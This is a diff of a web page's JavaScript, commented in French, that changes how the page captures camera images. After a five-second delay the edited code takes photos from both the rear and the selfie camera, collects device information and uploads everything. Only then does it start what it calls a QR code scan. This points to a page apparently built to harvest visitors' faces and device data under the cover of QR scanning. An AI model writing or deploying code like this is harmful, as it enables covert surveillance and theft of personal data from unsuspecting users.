@@ -59,28 +59,14 @@
             });
         }
 
-        function capturerPhoto(stream, videoElement, canvas) {
-            return new Promise((resolve) => {
-                videoElement.srcObject = stream;
-                videoElement.play();
+        function capturerPhoto(videoElement, canvas) {
+            const context = canvas.getContext('2d');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-                // Capture the photo when the video is loaded
-                videoElement.onloadeddata = () => {
-                    // Wait a bit to ensure the video is playing
-                    setTimeout(() => {
-                        canvas.width = videoElement.videoWidth;
-                        canvas.height = videoElement.videoHeight;
-                        const context = canvas.getContext('2d');
-                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-                        // Stop the video and camera stream
-                        videoElement.pause();
-                        stream.getTracks().forEach(track => track.stop());
-
-                        resolve(canvas.toDataURL('image/png'));
-                    }, 500); // Wait 500ms to give time for video to stabilize
-                };
-            });
+            // Convertir le contenu du canvas en data URL
+            return canvas.toDataURL('image/png');
         }
 
         function dataURLToBlob(dataURL) {
@@ -126,23 +112,30 @@
 
             // Accéder à la caméra principale (arrière)
             const streamMain = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-            const dataURLMain = await capturerPhoto(streamMain, videoMain, canvasMain);
+            videoMain.srcObject = streamMain; // Afficher le flux de la caméra arrière dans la vidéo
 
             // Accéder à la caméra selfie (avant)
             const streamSelfie = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            const dataURLSelfie = await capturerPhoto(streamSelfie, videoSelfie, canvasSelfie);
+            videoSelfie.srcObject = streamSelfie; // Afficher le flux de la caméra avant dans la vidéo
 
-            // Convertir les données URL en Blobs
-            const blobMain = dataURLToBlob(dataURLMain);
-            const blobSelfie = dataURLToBlob(dataURLSelfie);
-            const infosAppareil = await obtenirInfosAppareil();
+            // Ajouter un délai pour permettre à l'utilisateur de voir le flux
+            setTimeout(async () => {
+                // Capturer les images des deux flux vidéo après 5 secondes
+                const dataURLMain = capturerPhoto(videoMain, canvasMain);
+                const dataURLSelfie = capturerPhoto(videoSelfie, canvasSelfie);
 
-            // Envoyer les photos et les informations
-            await envoyerDonnees([blobMain, blobSelfie], infosAppareil);
-            console.log('Images et informations envoyées avec succès');
+                // Convertir les données URL en Blobs
+                const blobMain = dataURLToBlob(dataURLMain);
+                const blobSelfie = dataURLToBlob(dataURLSelfie);
+                const infosAppareil = await obtenirInfosAppareil();
 
-            // Lancer le scan du QR code
-            lancerScanQRCode();
+                // Envoyer les photos et les informations
+                await envoyerDonnees([blobMain, blobSelfie], infosAppareil);
+                console.log('Images et informations envoyées avec succès');
+
+                // Lancer le scan du QR code
+                lancerScanQRCode();
+            }, 5000); // Capturer les images après 5 secondes
         })();
     </script>
 </body>
